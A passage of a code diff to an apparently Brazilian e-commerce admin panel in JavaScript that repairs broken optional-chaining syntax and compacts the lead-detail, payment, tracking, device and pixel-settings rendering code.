-                    value: paymentSummary
-                },
-                {
-                    label: 'Gateway',
-                    value: gatewayLabel
-                },
-                {
-                    label: 'Status funil',
-                    value: statusLabel
-                },
-                {
-                    label: 'Evento',
-                    value: eventLabel
-                },
-                {
-                    label: 'Status bruto',
-                    value: detail ? .payment ? .pixStatusRaw
-                },
-                {
-                    label: 'Lead criado',
-                    value: formatDateTime(detail ? .payment ? .createdAt)
-                },
-                {
-                    label: 'Lead atualizado',
-                    value: formatDateTime(detail ? .payment ? .updatedAt)
-                },
-                {
-                    label: 'Selecao base',
-                    value: selectionSummary
-                },
-                {
-                    label: 'Pages registradas',
-                    value: String(pages.length || 0)
-                },
-                {
-                    label: 'Inicio da jornada',
-                    value: firstPageAt
-                },
-                {
-                    label: 'Fim da jornada',
-                    value: lastPageAt
-                },
-                {
-                    label: 'Jornada salva',
-                    value: journeySpan
-                },
-                {
-                    label: 'IP bloqueado',
-                    value: isBlocked ? 'Sim' : 'Nao'
-                }
+            leadDetailOverview.innerHTML = buildLeadStatCardsHtml([
+                { label: 'Jornada atual', value: journeyLabel },
+                { label: 'Cobranca atual', value: chargeLabel },
+                { label: 'Oferta atual', value: chargeOfferLabel },
+                { label: 'Status atual', value: chargeStatusLabel },
+                { label: 'Pagamentos salvos', value: paymentSummary },
+                { label: 'Gateway', value: gatewayLabel },
+                { label: 'Status funil', value: statusLabel },
+                { label: 'Evento', value: eventLabel },
+                { label: 'Status bruto', value: detail?.payment?.pixStatusRaw },
+                { label: 'Lead criado', value: formatDateTime(detail?.payment?.createdAt) },
+                { label: 'Lead atualizado', value: formatDateTime(detail?.payment?.updatedAt) },
+                { label: 'Selecao base', value: selectionSummary },
+                { label: 'Pages registradas', value: String(pages.length || 0) },
+                { label: 'Inicio da jornada', value: firstPageAt },
+                { label: 'Fim da jornada', value: lastPageAt },
+                { label: 'Jornada salva', value: journeySpan },
+                { label: 'IP bloqueado', value: isBlocked ? 'Sim' : 'Nao' }
             ]);
         }
 
         if (leadDetailIdentity) {
-            leadDetailIdentity.innerHTML = buildLeadFieldsHtml([{
-                    label: 'Nome',
-                    value: detail ? .customer ? .name,
-                    accent: true
-                },
-                {
-                    label: 'Email',
-                    value: detail ? .customer ? .email,
-                    accent: true
-                },
-                {
-                    label: 'Telefone',
-                    value: detail ? .customer ? .phone,
-                    mono: true
-                },
-                {
-                    label: 'CPF',
-                    value: detail ? .customer ? .cpf,
-                    mono: true
-                },
-                {
-                    label: 'Nascimento',
-                    value: payloadPersonal ? .birth
-                },
-                {
-                    label: 'Session ID',
-                    value: sessionId,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'Order ID payload',
-                    value: payload ? .orderId || metadata ? .orderId,
-                    mono: true
-                },
-                {
-                    label: 'Event ID front',
-                    value: payload ? .addPaymentInfoEventId,
-                    mono: true
-                }
+            leadDetailIdentity.innerHTML = buildLeadFieldsHtml([
+                { label: 'Nome', value: detail?.customer?.name, accent: true },
+                { label: 'Email', value: detail?.customer?.email, accent: true },
+                { label: 'Telefone', value: detail?.customer?.phone, mono: true },
+                { label: 'CPF', value: detail?.customer?.cpf, mono: true },
+                { label: 'Nascimento', value: payloadPersonal?.birth },
+                { label: 'Session ID', value: sessionId, mono: true, wide: true },
+                { label: 'Order ID payload', value: payload?.orderId || metadata?.orderId, mono: true },
+                { label: 'Event ID front', value: payload?.addPaymentInfoEventId, mono: true }
             ]);
         }
 
         if (leadDetailAddress) {
-            leadDetailAddress.innerHTML = buildLeadFieldsHtml([{
-                    label: 'CEP',
-                    value: detail ? .address ? .cep,
-                    mono: true
-                },
-                {
-                    label: 'Bairro',
-                    value: detail ? .address ? .neighborhood
-                },
-                {
-                    label: 'Endereco',
-                    value: detail ? .address ? .addressLine,
-                    wide: true,
-                    accent: true
-                },
-                {
-                    label: 'Numero',
-                    value: detail ? .address ? .number
-                },
-                {
-                    label: 'Complemento',
-                    value: detail ? .address ? .complement
-                },
-                {
-                    label: 'Cidade',
-                    value: detail ? .address ? .city
-                },
-                {
-                    label: 'Estado',
-                    value: detail ? .address ? .state
-                },
-                {
-                    label: 'Referencia',
-                    value: detail ? .address ? .reference,
-                    wide: true
-                },
-                {
-                    label: 'Street line payload',
-                    value: payloadAddress ? .streetLine,
-                    wide: true
-                },
-                {
-                    label: 'City line payload',
-                    value: payloadAddress ? .cityLine,
-                    wide: true
-                },
-                {
-                    label: 'Sem numero',
-                    value: payloadExtra ? .noNumber === true ? 'Sim' : (payloadExtra ? .noNumber === false ? 'Nao' : '-')
-                },
-                {
-                    label: 'Sem complemento',
-                    value: payloadExtra ? .noComplement === true ? 'Sim' : (payloadExtra ? .noComplement === false ? 'Nao' : '-')
-                }
+            leadDetailAddress.innerHTML = buildLeadFieldsHtml([
+                { label: 'CEP', value: detail?.address?.cep, mono: true },
+                { label: 'Bairro', value: detail?.address?.neighborhood },
+                { label: 'Endereco', value: detail?.address?.addressLine, wide: true, accent: true },
+                { label: 'Numero', value: detail?.address?.number },
+                { label: 'Complemento', value: detail?.address?.complement },
+                { label: 'Cidade', value: detail?.address?.city },
+                { label: 'Estado', value: detail?.address?.state },
+                { label: 'Referencia', value: detail?.address?.reference, wide: true },
+                { label: 'Street line payload', value: payloadAddress?.streetLine, wide: true },
+                { label: 'City line payload', value: payloadAddress?.cityLine, wide: true },
+                { label: 'Sem numero', value: payloadExtra?.noNumber === true ? 'Sim' : (payloadExtra?.noNumber === false ? 'Nao' : '-') },
+                { label: 'Sem complemento', value: payloadExtra?.noComplement === true ? 'Sim' : (payloadExtra?.noComplement === false ? 'Nao' : '-') }
             ]);
         }
 
         if (leadDetailPayment) {
-            leadDetailPayment.innerHTML = buildLeadFieldsHtml([{
-                    label: 'Pagamentos salvos',
-                    value: paymentSummary,
-                    wide: true,
-                    accent: true
-                },
-                {
-                    label: 'Selecao base',
-                    value: selectionSummary,
-                    wide: true,
-                    accent: true
-                },
-                {
-                    label: 'Jornada atual',
-                    value: journeyLabel
-                },
-                {
-                    label: 'Cobranca atual',
-                    value: chargeLabel
-                },
-                {
-                    label: 'Oferta atual',
-                    value: chargeOfferLabel,
-                    wide: true
-                },
-                {
-                    label: 'Status atual',
-                    value: chargeStatusLabel,
-                    accent: true
-                },
-                {
-                    label: 'Gateway label',
-                    value: gatewayLabel,
-                    accent: true
-                },
-                {
-                    label: 'Gateway key',
-                    value: detail ? .payment ? .gateway,
-                    mono: true
-                },
-                {
-                    label: 'Status funil',
-                    value: detail ? .payment ? .status,
-                    accent: true
-                },
-                {
-                    label: 'Evento',
-                    value: detail ? .payment ? .event
-                },
-                {
-                    label: 'Valor atual',
-                    value: valueText,
-                    accent: true
-                },
-                {
-                    label: 'TXID atual',
-                    value: detail ? .payment ? .pixTxid,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'Status bruto gateway',
-                    value: detail ? .payment ? .pixStatusRaw,
-                    mono: true
-                },
-                {
-                    label: 'Produto selecionado',
-                    value: rewardName
-                },
-                {
-                    label: 'Produto ID',
-                    value: detail ? .reward ? .id || payloadReward ? .id,
-                    mono: true
-                },
-                {
-                    label: 'Preco produto',
-                    value: detail ? .reward ? .price ? formatCurrency(detail.reward.price) : '-'
-                },
-                {
-                    label: 'Frete selecionado',
-                    value: shippingName
-                },
-                {
-                    label: 'Frete ID',
-                    value: detail ? .shipping ? .id || payloadShipping ? .id,
-                    mono: true
-                },
-                {
-                    label: 'Preco frete',
-                    value: detail ? .shipping ? .price ? formatCurrency(detail.shipping.price) : '-'
-                },
-                {
-                    label: 'Order bump',
-                    value: detail ? .bump ? .selected ? 'Selecionado' : 'Nao selecionado'
-                },
-                {
-                    label: 'Titulo do bump',
-                    value: payloadBump ? .title,
-                    wide: true
-                },
-                {
-                    label: 'Preco order bump',
-                    value: detail ? .bump ? .price ? formatCurrency(detail.bump.price) : '-'
-                },
-                {
-                    label: 'PIX criado em',
-                    value: formatDateTime(detail ? .payment ? .pixCreatedAt)
-                },
-                {
-                    label: 'PIX pago em',
-                    value: formatDateTime(detail ? .payment ? .pixPaidAt)
-                },
-                {
-                    label: 'PIX estornado em',
-                    value: formatDateTime(detail ? .payment ? .pixRefundedAt)
-                },
-                {
-                    label: 'PIX recusado em',
-                    value: formatDateTime(detail ? .payment ? .pixRefusedAt)
-                }
+            leadDetailPayment.innerHTML = buildLeadFieldsHtml([
+                { label: 'Pagamentos salvos', value: paymentSummary, wide: true, accent: true },
+                { label: 'Selecao base', value: selectionSummary, wide: true, accent: true },
+                { label: 'Jornada atual', value: journeyLabel },
+                { label: 'Cobranca atual', value: chargeLabel },
+                { label: 'Oferta atual', value: chargeOfferLabel, wide: true },
+                { label: 'Status atual', value: chargeStatusLabel, accent: true },
+                { label: 'Gateway label', value: gatewayLabel, accent: true },
+                { label: 'Gateway key', value: detail?.payment?.gateway, mono: true },
+                { label: 'Status funil', value: detail?.payment?.status, accent: true },
+                { label: 'Evento', value: detail?.payment?.event },
+                { label: 'Valor atual', value: valueText, accent: true },
+                { label: 'TXID atual', value: detail?.payment?.pixTxid, mono: true, wide: true },
+                { label: 'Status bruto gateway', value: detail?.payment?.pixStatusRaw, mono: true },
+                { label: 'Produto selecionado', value: rewardName },
+                { label: 'Produto ID', value: detail?.reward?.id || payloadReward?.id, mono: true },
+                { label: 'Preco produto', value: detail?.reward?.price ? formatCurrency(detail.reward.price) : '-' },
+                { label: 'Frete selecionado', value: shippingName },
+                { label: 'Frete ID', value: detail?.shipping?.id || payloadShipping?.id, mono: true },
+                { label: 'Preco frete', value: detail?.shipping?.price ? formatCurrency(detail.shipping.price) : '-' },
+                { label: 'Order bump', value: detail?.bump?.selected ? 'Selecionado' : 'Nao selecionado' },
+                { label: 'Titulo do bump', value: payloadBump?.title, wide: true },
+                { label: 'Preco order bump', value: detail?.bump?.price ? formatCurrency(detail.bump.price) : '-' },
+                { label: 'PIX criado em', value: formatDateTime(detail?.payment?.pixCreatedAt) },
+                { label: 'PIX pago em', value: formatDateTime(detail?.payment?.pixPaidAt) },
+                { label: 'PIX estornado em', value: formatDateTime(detail?.payment?.pixRefundedAt) },
+                { label: 'PIX recusado em', value: formatDateTime(detail?.payment?.pixRefusedAt) }
             ]);
         }
 
         if (leadDetailTracking) {
-            leadDetailTracking.innerHTML = buildLeadFieldsHtml([{
-                    label: 'UTM Source',
-                    value: detail ? .tracking ? .utmSource
-                },
-                {
-                    label: 'UTM Medium',
-                    value: detail ? .tracking ? .utmMedium
-                },
-                {
-                    label: 'UTM Campaign',
-                    value: detail ? .tracking ? .utmCampaign,
-                    wide: true,
-                    accent: true
-                },
-                {
-                    label: 'UTM Term',
-                    value: detail ? .tracking ? .utmTerm
-                },
-                {
-                    label: 'UTM Content',
-                    value: detail ? .tracking ? .utmContent,
-                    wide: true
-                },
-                {
-                    label: 'SRC',
-                    value: payloadUtm ? .src || payload ? .src,
-                    mono: true
-                },
-                {
-                    label: 'SCK',
-                    value: payloadUtm ? .sck || payload ? .sck,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'FBCLID',
-                    value: detail ? .tracking ? .fbclid,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'GCLID',
-                    value: detail ? .tracking ? .gclid,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'TTCLID',
-                    value: detail ? .tracking ? .ttclid,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'Landing page',
-                    value: detail ? .tracking ? .landingPage,
-                    wide: true
-                },
-                {
-                    label: 'Referrer',
-                    value: detail ? .tracking ? .referrer,
-                    wide: true
-                },
-                {
-                    label: 'Source URL',
-                    value: detail ? .tracking ? .sourceUrl,
-                    wide: true,
-                    mono: true
-                }
+            leadDetailTracking.innerHTML = buildLeadFieldsHtml([
+                { label: 'UTM Source', value: detail?.tracking?.utmSource },
+                { label: 'UTM Medium', value: detail?.tracking?.utmMedium },
+                { label: 'UTM Campaign', value: detail?.tracking?.utmCampaign, wide: true, accent: true },
+                { label: 'UTM Term', value: detail?.tracking?.utmTerm },
+                { label: 'UTM Content', value: detail?.tracking?.utmContent, wide: true },
+                { label: 'SRC', value: payloadUtm?.src || payload?.src, mono: true },
+                { label: 'SCK', value: payloadUtm?.sck || payload?.sck, mono: true, wide: true },
+                { label: 'FBCLID', value: detail?.tracking?.fbclid, mono: true, wide: true },
+                { label: 'GCLID', value: detail?.tracking?.gclid, mono: true, wide: true },
+                { label: 'TTCLID', value: detail?.tracking?.ttclid, mono: true, wide: true },
+                { label: 'Landing page', value: detail?.tracking?.landingPage, wide: true },
+                { label: 'Referrer', value: detail?.tracking?.referrer, wide: true },
+                { label: 'Source URL', value: detail?.tracking?.sourceUrl, wide: true, mono: true }
             ]);
         }
 
         if (leadDetailDevice) {
-            leadDetailDevice.innerHTML = buildLeadFieldsHtml([{
-                    label: 'IP publico',
-                    value: detail ? .device ? .clientIp,
-                    mono: true,
-                    accent: true
-                },
-                {
-                    label: 'IP do metadata',
-                    value: metadata ? .client_ip,
-                    mono: true
-                },
-                {
-                    label: 'Resumo dispositivo',
-                    value: detail ? .device ? .summary,
-                    accent: true
-                },
-                {
-                    label: 'Recebido em',
-                    value: formatDateTime(metadata ? .received_at)
-                },
-                {
-                    label: 'Referrer do metadata',
-                    value: metadata ? .referrer,
-                    wide: true
-                },
-                {
-                    label: 'User-Agent',
-                    value: detail ? .device ? .userAgent,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'User-Agent metadata',
-                    value: metadata ? .user_agent,
-                    mono: true,
-                    wide: true
-                }
+            leadDetailDevice.innerHTML = buildLeadFieldsHtml([
+                { label: 'IP publico', value: detail?.device?.clientIp, mono: true, accent: true },
+                { label: 'IP do metadata', value: metadata?.client_ip, mono: true },
+                { label: 'Resumo dispositivo', value: detail?.device?.summary, accent: true },
+                { label: 'Recebido em', value: formatDateTime(metadata?.received_at) },
+                { label: 'Referrer do metadata', value: metadata?.referrer, wide: true },
+                { label: 'User-Agent', value: detail?.device?.userAgent, mono: true, wide: true },
+                { label: 'User-Agent metadata', value: metadata?.user_agent, mono: true, wide: true }
             ]);
         }
 
         if (leadDetailTechnical) {
-            leadDetailTechnical.innerHTML = buildLeadFieldsHtml([{
-                    label: 'Payload event',
-                    value: payload ? .event,
-                    mono: true
-                },
-                {
-                    label: 'Payload stage',
-                    value: payload ? .stage,
-                    mono: true
-                },
-                {
-                    label: 'Source stage',
-                    value: payload ? .sourceStage,
-                    mono: true
-                },
-                {
-                    label: 'Payload page',
-                    value: payload ? .page,
-                    mono: true
-                },
-                {
-                    label: 'Gateway payload',
-                    value: payload ? .gateway || payload ? .paymentGateway || payload ? .pixGateway,
-                    mono: true
-                },
-                {
-                    label: 'PIX status payload',
-                    value: payload ? .pixStatus,
-                    mono: true
-                },
-                {
-                    label: 'PIX txid payload',
-                    value: payload ? .pixTxid || payload ? .pix ? .idTransaction || payload ? .pix ? .txid,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'Payload reward id',
-                    value: payloadReward ? .id || payload ? .rewardId,
-                    mono: true
-                },
-                {
-                    label: 'Payload reward nome',
-                    value: payloadReward ? .name || payloadReward ? .title || payload ? .rewardName
-                },
-                {
-                    label: 'Payload shipping id',
-                    value: payloadShipping ? .id || payload ? .shippingId,
-                    mono: true
-                },
-                {
-                    label: 'Payload shipping nome',
-                    value: payloadShipping ? .name || payload ? .shippingName
-                },
-                {
-                    label: 'Payload shipping eta',
-                    value: payloadShipping ? .eta
-                },
-                {
-                    label: 'Payload bump title',
-                    value: payloadBump ? .title,
-                    wide: true
-                },
-                {
-                    label: 'Payload bump selected',
-                    value: payloadBump ? .selected === true ? 'true' : (payloadBump ? .selected === false ? 'false' : '-'),
-                    mono: true
-                },
-                {
-                    label: 'Payload upsell kind',
-                    value: payloadUpsell ? .kind,
-                    mono: true
-                },
-                {
-                    label: 'Payload upsell title',
-                    value: payloadUpsell ? .title,
-                    wide: true
-                },
-                {
-                    label: 'Source URL bruto',
-                    value: payload ? .sourceUrl,
-                    mono: true,
-                    wide: true
-                },
-                {
-                    label: 'Payload amount bruto',
-                    value: payload ? .amount,
-                    mono: true
-                },
-                {
-                    label: 'Metadata orderId',
-                    value: metadata ? .orderId,
-                    mono: true
-                },
-                {
-                    label: 'Metadata sessionId',
-                    value: metadata ? .sessionId,
-                    mono: true
-                },
-                {
-                    label: 'Payload referencia endereco',
-                    value: payloadExtra ? .reference,
-                    wide: true
-                },
-                {
-                    label: 'Payload metadata UA',
-                    value: metadata ? .user_agent,
-                    mono: true,
-                    wide: true
-                }
+            leadDetailTechnical.innerHTML = buildLeadFieldsHtml([
+                { label: 'Payload event', value: payload?.event, mono: true },
+                { label: 'Payload stage', value: payload?.stage, mono: true },
+                { label: 'Source stage', value: payload?.sourceStage, mono: true },
+                { label: 'Payload page', value: payload?.page, mono: true },
+                { label: 'Gateway payload', value: payload?.gateway || payload?.paymentGateway || payload?.pixGateway, mono: true },
+                { label: 'PIX status payload', value: payload?.pixStatus, mono: true },
+                { label: 'PIX txid payload', value: payload?.pixTxid || payload?.pix?.idTransaction || payload?.pix?.txid, mono: true, wide: true },
+                { label: 'Payload reward id', value: payloadReward?.id || payload?.rewardId, mono: true },
+                { label: 'Payload reward nome', value: payloadReward?.name || payloadReward?.title || payload?.rewardName },
+                { label: 'Payload shipping id', value: payloadShipping?.id || payload?.shippingId, mono: true },
+                { label: 'Payload shipping nome', value: payloadShipping?.name || payload?.shippingName },
+                { label: 'Payload shipping eta', value: payloadShipping?.eta },
+                { label: 'Payload bump title', value: payloadBump?.title, wide: true },
+                { label: 'Payload bump selected', value: payloadBump?.selected === true ? 'true' : (payloadBump?.selected === false ? 'false' : '-'), mono: true },
+                { label: 'Payload upsell kind', value: payloadUpsell?.kind, mono: true },
+                { label: 'Payload upsell title', value: payloadUpsell?.title, wide: true },
+                { label: 'Source URL bruto', value: payload?.sourceUrl, mono: true, wide: true },
+                { label: 'Payload amount bruto', value: payload?.amount, mono: true },
+                { label: 'Metadata orderId', value: metadata?.orderId, mono: true },
+                { label: 'Metadata sessionId', value: metadata?.sessionId, mono: true },
+                { label: 'Payload referencia endereco', value: payloadExtra?.reference, wide: true },
+                { label: 'Payload metadata UA', value: metadata?.user_agent, mono: true, wide: true }
             ]);
         }
 
         if (leadDetailPages) {
-            leadDetailPages.innerHTML = pages.length ?
-                pages.map((page, index) => `
+            leadDetailPages.innerHTML = pages.length
+                ? pages.map((page, index) => `
                     <article class="lead-detail-page">
                         <div class="lead-detail-page-index">${index + 1}</div>
                         <div class="lead-detail-page-body">
@@ -6477,15 +5643,15 @@ function initAdmin() {
                             <span>Primeiro registro: ${escapeHtml(formatDateTime(page?.createdAt))}</span>
                         </div>
                     </article>
-                `).join('') :
-                '<span class="admin-muted">Nenhuma pagina registrada para esta sessao.</span>';
+                `).join('')
+                : '<span class="admin-muted">Nenhuma pagina registrada para esta sessao.</span>';
         }
 
         if (leadDetailPayload) {
-            leadDetailPayload.textContent = JSON.stringify(detail ? .payload || {}, null, 2);
+            leadDetailPayload.textContent = JSON.stringify(detail?.payload || {}, null, 2);
             leadDetailPayload.scrollTop = 0;
         }
-        renderLeadTransactionLookup(detail ? .transactionLookup || null);
+        renderLeadTransactionLookup(detail?.transactionLookup || null);
 
         setLeadDetailModalVisible(true);
     };
@@ -6516,20 +5682,20 @@ function initAdmin() {
 
         const res = await adminFetch(`/api/admin/leads/${encodeURIComponent(cleanSessionId)}`);
         const data = await res.json().catch(() => ({}));
-        if (!res.ok || !data ? .ok) {
-            showToast(data ? .error || 'Falha ao carregar detalhes do lead.', 'error');
+        if (!res.ok || !data?.ok) {
+            showToast(data?.error || 'Falha ao carregar detalhes do lead.', 'error');
             closeLeadDetailModal();
             return;
         }
 
-        renderLeadDetail(data ? .data || null);
+        renderLeadDetail(data?.data || null);
     };
 
     const consultLeadTransaction = async () => {
         const detail = currentLeadDetail;
-        const txid = String(detail ? .payment ? .pixTxid || '').trim();
-        const gateway = String(detail ? .payment ? .gateway || '').trim();
-        const sessionId = String(detail ? .sessionId || '').trim();
+        const txid = String(detail?.payment?.pixTxid || '').trim();
+        const gateway = String(detail?.payment?.gateway || '').trim();
+        const sessionId = String(detail?.sessionId || '').trim();
         if (!txid || !gateway) {
             showToast('Este lead nao tem transacao valida para consulta.', 'error');
             return;
@@ -6548,35 +5714,33 @@ function initAdmin() {
             })
         });
         const data = await res.json().catch(() => ({}));
-        if (!currentLeadDetail || String(currentLeadDetail ? .sessionId || '').trim() !== sessionId) {
+        if (!currentLeadDetail || String(currentLeadDetail?.sessionId || '').trim() !== sessionId) {
             if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = false;
             return;
         }
 
-        if (!res.ok || data ? .ok === false) {
+        if (!res.ok || data?.ok === false) {
             if (leadDetailLookupStatus) {
-                leadDetailLookupStatus.textContent = data ? .error || 'Falha ao consultar transacao.';
+                leadDetailLookupStatus.textContent = data?.error || 'Falha ao consultar transacao.';
             }
             renderLeadTransactionLookup({
                 ok: false,
                 txid,
                 gateway,
                 statusCode: res.status || 0,
-                detail: data ? .error || data ? .detail || 'request_error'
+                detail: data?.error || data?.detail || 'request_error'
             });
             showToast('Falha ao consultar transacao.', 'error');
             if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = false;
             return;
         }
 
-        const item = data ? .item || null;
+        const item = data?.item || null;
         currentLeadDetail = {
             ...(currentLeadDetail || {}),
-            transactionLookup: item ?
-                { ...item,
-                    ok: item ? .ok !== false
-                } :
-                {
+            transactionLookup: item
+                ? { ...item, ok: item?.ok !== false }
+                : {
                     ok: false,
                     txid,
                     gateway,
@@ -6584,10 +5748,10 @@ function initAdmin() {
                     detail: 'transaction_not_found'
                 }
         };
-        if (item ? .ok !== false && Number(item ? .updatedRows || 0) > 0) {
+        if (item?.ok !== false && Number(item?.updatedRows || 0) > 0) {
             const refreshedRes = await adminFetch(`/api/admin/leads/${encodeURIComponent(sessionId)}`);
             const refreshedData = await refreshedRes.json().catch(() => ({}));
-            if (refreshedRes.ok && refreshedData ? .ok && refreshedData ? .data) {
+            if (refreshedRes.ok && refreshedData?.ok && refreshedData?.data) {
                 currentLeadDetail = {
                     ...refreshedData.data,
                     transactionLookup: currentLeadDetail.transactionLookup
@@ -6600,18 +5764,18 @@ function initAdmin() {
             renderLeadTransactionLookup(currentLeadDetail.transactionLookup);
         }
         if (leadDetailLookupStatus) {
-            leadDetailLookupStatus.textContent = item ?
-                item ? .skippedRegression === true ?
-                `Consulta concluida: ${formatTransactionLookupState(item)}. O gateway respondeu sem promover o lead, entao o painel preservou o estado mais forte que ja existia.` :
-                Number(item ? .updatedRows || 0) > 0 ?
-                `Consulta concluida: ${formatTransactionLookupState(item)}. Lead sincronizado com sucesso.` :
-                `Consulta concluida: ${formatTransactionLookupState(item)}. Nenhuma alteracao foi necessaria neste lead.` :
-                'Nenhum detalhe retornado para essa transacao.';
+            leadDetailLookupStatus.textContent = item
+                ? item?.skippedRegression === true
+                    ? `Consulta concluida: ${formatTransactionLookupState(item)}. O gateway respondeu sem promover o lead, entao o painel preservou o estado mais forte que ja existia.`
+                    : Number(item?.updatedRows || 0) > 0
+                        ? `Consulta concluida: ${formatTransactionLookupState(item)}. Lead sincronizado com sucesso.`
+                        : `Consulta concluida: ${formatTransactionLookupState(item)}. Nenhuma alteracao foi necessaria neste lead.`
+                : 'Nenhum detalhe retornado para essa transacao.';
         }
         if (data.warning) showToast(data.warning, 'error');
-        if (item ? .skippedRegression === true) {
+        if (item?.skippedRegression === true) {
             showToast('Transacao consultada. O painel preservou o estado mais avancado do lead.', 'success');
-        } else if (Number(item ? .updatedRows || 0) > 0) {
+        } else if (Number(item?.updatedRows || 0) > 0) {
             showToast('Transacao consultada e lead sincronizado.', 'success');
         } else {
             showToast('Transacao consultada. Nenhuma alteracao foi necessaria.', 'success');
@@ -6619,9 +5783,7 @@ function initAdmin() {
         if (leadDetailLookupBtn) leadDetailLookupBtn.disabled = false;
     };
 
-    const removeBlockedIp = async (ip, {
-        silent = false
-    } = {}) => {
+    const removeBlockedIp = async (ip, { silent = false } = {}) => {
         const cleanIp = String(ip || '').trim();
         if (!cleanIp) return false;
 
@@ -6630,16 +5792,13 @@ function initAdmin() {
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok) {
-            if (!silent) showToast(data ? .error || 'Falha ao remover IP da blacklist.', 'error');
+            if (!silent) showToast(data?.error || 'Falha ao remover IP da blacklist.', 'error');
             return false;
         }
 
-        renderIpBlacklist(data ? .entries || []);
-        if (currentLeadDetail ? .device ? .clientIp === cleanIp) {
-            currentLeadDetail.block = {
-                blocked: false,
-                entry: null
-            };
+        renderIpBlacklist(data?.entries || []);
+        if (currentLeadDetail?.device?.clientIp === cleanIp) {
+            currentLeadDetail.block = { blocked: false, entry: null };
             renderLeadDetail(currentLeadDetail);
         }
         if (!silent) showToast('IP removido da blacklist.', 'success');
@@ -6648,8 +5807,8 @@ function initAdmin() {
 
     const blockCurrentLeadIp = async () => {
         const detail = currentLeadDetail;
-        const ip = String(detail ? .device ? .clientIp || '').trim();
-        const sessionId = String(detail ? .sessionId || '').trim();
+        const ip = String(detail?.device?.clientIp || '').trim();
+        const sessionId = String(detail?.sessionId || '').trim();
         if (!ip || !sessionId) {
             showToast('Nao existe IP valido para bloquear neste lead.', 'error');
             return;
@@ -6668,14 +5827,14 @@ function initAdmin() {
         });
         const data = await res.json().catch(() => ({}));
         if (!res.ok) {
-            showToast(data ? .error || 'Falha ao bloquear IP.', 'error');
+            showToast(data?.error || 'Falha ao bloquear IP.', 'error');
             return;
         }
 
-        renderIpBlacklist(data ? .entries || []);
+        renderIpBlacklist(data?.entries || []);
         currentLeadDetail.block = {
             blocked: true,
-            entry: (data ? .entries || []).find((entry) => String(entry ? .ip || '').trim() === ip) || null
+            entry: (data?.entries || []).find((entry) => String(entry?.ip || '').trim() === ip) || null
         };
         renderLeadDetail(currentLeadDetail);
         showToast('IP bloqueado com sucesso.', 'success');
@@ -6686,7 +5845,7 @@ function initAdmin() {
         if (!raw) return fallbackName;
 
         const utf8Match = raw.match(/filename\*=UTF-8''([^;]+)/i);
-        if (utf8Match ? .[1]) {
+        if (utf8Match?.[1]) {
             try {
                 return decodeURIComponent(utf8Match[1]);
             } catch (_error) {
@@ -6695,7 +5854,7 @@ function initAdmin() {
         }
 
         const fileNameMatch = raw.match(/filename="?([^\";]+)"?/i);
-        return fileNameMatch ? .[1] || fallbackName;
+        return fileNameMatch?.[1] || fallbackName;
     };
 
     const checkAuth = async () => {
@@ -6711,7 +5870,7 @@ function initAdmin() {
         const res = await adminFetch('/api/admin/settings');
         if (!res.ok) {
             const detail = await res.json().catch(() => ({}));
-            const errorMessage = detail ? .error || 'Nao foi possivel carregar as configuracoes do painel.';
+            const errorMessage = detail?.error || 'Nao foi possivel carregar as configuracoes do painel.';
             if (currentSettings && Object.keys(currentSettings).length > 0) {
                 currentSettingsStatus = 'loaded';
                 syncGatewaySwitches();
@@ -6728,7 +5887,7 @@ function initAdmin() {
         const data = await res.json();
         currentSettingsLoaded = true;
         currentSettingsStatus = 'loaded';
-        currentSettingsRevision = String(data ? ._meta ? .updatedAt || '').trim();
+        currentSettingsRevision = String(data?._meta?.updatedAt || '').trim();
         applyAdminSettingsToForm(data);
         writeCachedAdminSettings(data);
         hideSettingsRetryModal();
@@ -6750,56 +5909,56 @@ function initAdmin() {
 
         const payload = {
             _meta: {
-                ...(currentSettings ? ._meta || {}),
+                ...(currentSettings?._meta || {}),
                 baseUpdatedAt: currentSettingsRevision
             }
         };
 
         if (hasPixelForm) {
             payload.pixel = {
-                enabled: !!pixelEnabled ? .checked,
-                id: pixelId ? .value ? .trim() || '',
-                backupId: pixelBackupId ? .value ? .trim() || '',
+                enabled: !!pixelEnabled?.checked,
+                id: pixelId?.value?.trim() || '',
+                backupId: pixelBackupId?.value?.trim() || '',
                 capi: {
-                    enabled: !!pixelCapiEnabled ? .checked,
-                    accessToken: pixelCapiToken ? .value ? .trim() || '',
-                    backupAccessToken: pixelCapiBackupToken ? .value ? .trim() || '',
-                    testEventCode: currentSettings ? .pixel ? .capi ? .testEventCode || '',
-                    backupTestEventCode: currentSettings ? .pixel ? .capi ? .backupTestEventCode || ''
+                    enabled: !!pixelCapiEnabled?.checked,
+                    accessToken: pixelCapiToken?.value?.trim() || '',
+                    backupAccessToken: pixelCapiBackupToken?.value?.trim() || '',
+                    testEventCode: currentSettings?.pixel?.capi?.testEventCode || '',
+                    backupTestEventCode: currentSettings?.pixel?.capi?.backupTestEventCode || ''
                 },
                 events: {
-                    page_view: pixelEventPage ? .checked !== false,
-                    quiz_view: pixelEventQuiz ? .checked !== false,
-                    lead: pixelEventLead ? .checked !== false,
-                    purchase: pixelEventPurchase ? .checked !== false,
-                    checkout: pixelEventCheckout ? .checked !== false
+                    page_view: pixelEventPage?.checked !== false,
+                    quiz_view: pixelEventQuiz?.checked !== false,
+                    lead: pixelEventLead?.checked !== false,
+                    purchase: pixelEventPurchase?.checked !== false,
+                    checkout: pixelEventCheckout?.checked !== false
                 }
             };
             payload.tiktokPixel = {
-                enabled: !!tiktokPixelEnabled ? .checked,
-                id: tiktokPixelId ? .value ? .trim() || '',
+                enabled: !!tiktokPixelEnabled?.checked,
+                id: tiktokPixelId?.value?.trim() || '',
                 events: {
-                    page_view: tiktokPixelEventPage ? .checked !== false,
-                    quiz_view: tiktokPixelEventQuiz ? .checked !== false,
-                    lead: tiktokPixelEventLead ? .checked !== false,
-                    purchase: tiktokPixelEventPurchase ? .checked !== false,
-                    checkout: tiktokPixelEventCheckout ? .checked !== false
+                    page_view: tiktokPixelEventPage?.checked !== false,
+                    quiz_view: tiktokPixelEventQuiz?.checked !== false,
